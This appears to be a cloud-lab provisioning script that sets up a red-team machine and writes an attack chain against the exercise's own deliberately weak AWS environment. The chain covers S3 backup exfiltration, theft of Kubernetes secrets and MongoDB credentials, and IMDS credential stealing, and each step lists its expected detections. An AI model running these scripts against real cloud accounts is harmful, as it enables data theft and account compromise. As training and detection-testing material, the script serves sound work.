#!/bin/bash
set -e

# Log everything
exec > >(tee /var/log/user-data.log) 2>&1
echo "Starting Red Team instance setup at $(date)"

# Update system
apt-get update
apt-get upgrade -y

# Configure SSH for public key only
sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
sed -i 's/^#*ChallengeResponseAuthentication.*/ChallengeResponseAuthentication no/' /etc/ssh/sshd_config
sed -i 's/^#*UsePAM.*/UsePAM no/' /etc/ssh/sshd_config
sed -i 's/^#*PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/^#*PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
echo "PasswordAuthentication no" >> /etc/ssh/sshd_config.d/pubkey-only.conf
systemctl restart sshd

# Install base tools
apt-get install -y \
  git curl wget jq unzip \
  nmap netcat-openbsd \
  python3 python3-pip python3-venv \
  mongodb-clients \
  dnsutils whois \
  tmux vim

# Install AWS CLI v2
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
./aws/install
rm -rf aws awscliv2.zip

# Install kubectl
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl
rm kubectl

# Install mongosh
wget -qO- https://www.mongodb.org/static/pgp/server-7.0.asc | gpg --dearmor -o /usr/share/keyrings/mongodb-server-7.0.gpg
echo "deb [ arch=amd64,arm64 signed-by=/usr/share/keyrings/mongodb-server-7.0.gpg ] https://repo.mongodb.org/apt/ubuntu jammy/mongodb-org/7.0 multiverse" | tee /etc/apt/sources.list.d/mongodb-org-7.0.list
apt-get update
apt-get install -y mongodb-mongosh

# Create attack scripts directory
mkdir -p /opt/redteam/scripts
cd /opt/redteam

# Environment info
cat > /opt/redteam/env.sh << 'ENVFILE'
export ENVIRONMENT="${environment}"
export MONGODB_IP="${mongodb_ip}"
export EKS_CLUSTER="${eks_cluster}"
export BACKUP_BUCKET="${backup_bucket}"
export AWS_REGION="${aws_region}"
ENVFILE

# 01 - Reconnaissance script
cat > /opt/redteam/scripts/01-recon.sh << 'RECON'
#!/bin/bash
source /opt/redteam/env.sh

echo "=== WIZ EXERCISE - RECONNAISSANCE PHASE ==="
echo ""

echo "[*] Phase 1: S3 Bucket Enumeration"
echo "    Target: $BACKUP_BUCKET"
echo ""

# List public bucket contents
echo "[+] Listing public S3 bucket contents..."
aws s3 ls s3://$BACKUP_BUCKET --no-sign-request 2>/dev/null || echo "    Bucket not publicly listable"

echo ""
echo "[+] Attempting to list backup files..."
aws s3 ls s3://$BACKUP_BUCKET/backups/ --no-sign-request 2>/dev/null

echo ""
echo "[*] Phase 2: Port Scanning"
echo "    Target: $MONGODB_IP"

# Quick port scan
echo "[+] Scanning common ports..."
nmap -Pn -p 22,27017,3389,443,80 $MONGODB_IP 2>/dev/null | grep -E "^[0-9]+/tcp"

echo ""
echo "=== RECON COMPLETE ==="
echo ""
echo "FINDINGS:"
echo "1. S3 bucket $BACKUP_BUCKET may contain database backups"
echo "2. Check for MongoDB on port 27017"
echo "3. Check for SSH on port 22"
RECON

# 02 - S3 Data Exfiltration script
cat > /opt/redteam/scripts/02-s3-exfil.sh << 'S3EXFIL'
#!/bin/bash
source /opt/redteam/env.sh

echo "=== WIZ EXERCISE - S3 DATA EXFILTRATION ==="
echo ""

echo "[*] Downloading backup files from public bucket..."
mkdir -p /opt/redteam/loot/backups

# Download all backup files
aws s3 sync s3://$BACKUP_BUCKET/backups/ /opt/redteam/loot/backups/ --no-sign-request 2>/dev/null

echo ""
echo "[+] Downloaded files:"
ls -la /opt/redteam/loot/backups/

echo ""
echo "[*] Checking for encrypted vs unencrypted backups..."
for f in /opt/redteam/loot/backups/*; do
  if file "$f" | grep -q "GPG"; then
    echo "    [ENCRYPTED] $f"
  else
    echo "    [UNENCRYPTED] $f - CAN BE EXTRACTED!"
  fi
done

echo ""
echo "=== S3 EXFIL COMPLETE ==="
echo ""
echo "DETECTION POINTS:"
echo "- GuardDuty: UnauthorizedAccess finding for S3"
echo "- CloudTrail: s3:GetObject and s3:ListBucket events"
echo "- Security Hub: Public bucket finding"
S3EXFIL

# 03 - Kubernetes exploitation script
cat > /opt/redteam/scripts/03-k8s-exploit.sh << 'K8SEXPLOIT'
#!/bin/bash
source /opt/redteam/env.sh

echo "=== WIZ EXERCISE - KUBERNETES EXPLOITATION ==="
echo ""

echo "[*] Setting up kubectl..."
aws eks update-kubeconfig --name $EKS_CLUSTER --region $AWS_REGION 2>/dev/null

echo ""
echo "[*] Phase 1: Enumerate cluster resources"
echo "[+] Listing namespaces..."
kubectl get namespaces 2>/dev/null

echo ""
echo "[+] Listing pods in tasky namespace..."
kubectl get pods -n tasky 2>/dev/null

echo ""
echo "[*] Phase 2: Extract secrets"
echo "[+] Listing secrets..."
kubectl get secrets -n tasky 2>/dev/null

echo ""
echo "[+] Extracting MongoDB credentials..."
MONGO_SECRET=$(kubectl get secret mongodb-credentials -n tasky -o jsonpath='{.data.MONGODB_URI}' 2>/dev/null | base64 -d)
if [ -n "$MONGO_SECRET" ]; then
  echo "    FOUND: $MONGO_SECRET"
  echo "$MONGO_SECRET" > /opt/redteam/loot/mongodb-credentials.txt
fi

echo ""
echo "[*] Phase 3: Check ServiceAccount permissions"
echo "[+] Current context permissions..."
kubectl auth can-i --list 2>/dev/null | head -20

echo ""
echo "=== K8S EXPLOIT COMPLETE ==="
echo ""
echo "DETECTION POINTS:"
echo "- GuardDuty EKS: Kubernetes.SuccessfulAnonymousAccess"
echo "- CloudTrail: eks:DescribeCluster API calls"
echo "- Wazuh: kubectl activity from unusual source"
K8SEXPLOIT

# 04 - MongoDB access script
cat > /opt/redteam/scripts/04-mongodb-access.sh << 'MONGOACCESS'
#!/bin/bash
source /opt/redteam/env.sh

echo "=== WIZ EXERCISE - MONGODB ACCESS ==="
echo ""

# Check if we have credentials
if [ -f /opt/redteam/loot/mongodb-credentials.txt ]; then
  MONGO_URI=$(cat /opt/redteam/loot/mongodb-credentials.txt)
  echo "[+] Using stolen credentials from K8s secret"
else
  echo "[-] No credentials found. Run 03-k8s-exploit.sh first"
  exit 1
fi

echo ""
echo "[*] Connecting to MongoDB..."
echo "[+] URI: $MONGO_URI"

# Connect and enumerate
mongosh "$MONGO_URI" --eval "
  print('=== Database Info ===');
  db.adminCommand('listDatabases');
  print('');
  print('=== Collections ===');
  db.getCollectionNames();
  print('');
  print('=== Sample Data ===');
  db.todos.find().limit(3);
"

echo ""
echo "=== MONGODB ACCESS COMPLETE ==="
echo ""
echo "DETECTION POINTS:"
echo "- Wazuh: MongoDB connection from unusual IP"
echo "- VPC Flow Logs: Connection to port 27017"
MONGOACCESS

# 05 - IMDS/Privilege Escalation script
cat > /opt/redteam/scripts/05-privesc.sh << 'PRIVESC'
#!/bin/bash
source /opt/redteam/env.sh

echo "=== WIZ EXERCISE - PRIVILEGE ESCALATION ==="
echo ""
echo "NOTE: This script demonstrates IMDS access on the MongoDB VM"
echo "      You would need SSH access to the MongoDB VM to run this"
echo ""

cat << 'IMDS_SCRIPT'
# Run these commands ON the MongoDB VM after gaining SSH access:

# Step 1: Query IMDS for instance role credentials
echo "[*] Querying Instance Metadata Service..."
ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
echo "    Found role: $ROLE_NAME"

# Step 2: Extract temporary credentials
echo "[*] Extracting temporary credentials..."
CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)
echo "$CREDS" | jq .

# Step 3: Export credentials
export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .Token)

# Step 4: Enumerate permissions with stolen credentials
echo "[*] Testing stolen credentials..."
aws sts get-caller-identity

echo "[*] Checking EC2 permissions (the VM has ec2:* !)..."
aws ec2 describe-instances --region us-east-1 | jq '.Reservations[].Instances[] | {id: .InstanceId, state: .State.Name, type: .InstanceType}'
IMDS_SCRIPT

echo ""
echo "=== PRIVESC INFO COMPLETE ==="
echo ""
echo "DETECTION POINTS:"
echo "- GuardDuty: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration"
echo "- CloudTrail: API calls from unexpected IP using instance credentials"
PRIVESC

# Make scripts executable
chmod +x /opt/redteam/scripts/*.sh

# Create README
cat > /opt/redteam/README.md << 'README'
# Wiz Exercise - Red Team Scripts

## Attack Chain Overview

1. **01-recon.sh** - Initial reconnaissance
   - S3 bucket enumeration
   - Port scanning

2. **02-s3-exfil.sh** - Data exfiltration
   - Download backups from public S3 bucket

3. **03-k8s-exploit.sh** - Kubernetes exploitation
   - Extract secrets from cluster
   - Demonstrate cluster-admin abuse

4. **04-mongodb-access.sh** - Database access
   - Connect using stolen credentials

5. **05-privesc.sh** - Privilege escalation
   - IMDS credential theft (run on MongoDB VM)
   - Demonstrate overprivileged IAM role

## Usage

```bash
source /opt/redteam/env.sh
cd /opt/redteam/scripts

# Run in sequence
./01-recon.sh
./02-s3-exfil.sh
./03-k8s-exploit.sh
./04-mongodb-access.sh
./05-privesc.sh
```

## Detection Points

Each script includes expected detection points for:
- AWS GuardDuty
- CloudTrail
- Wazuh
- Security Hub
README

echo ""
echo "Red Team instance setup completed at $(date)"
echo ""
echo "Attack scripts available at: /opt/redteam/scripts/"
echo "Run 'source /opt/redteam/env.sh' to load environment"
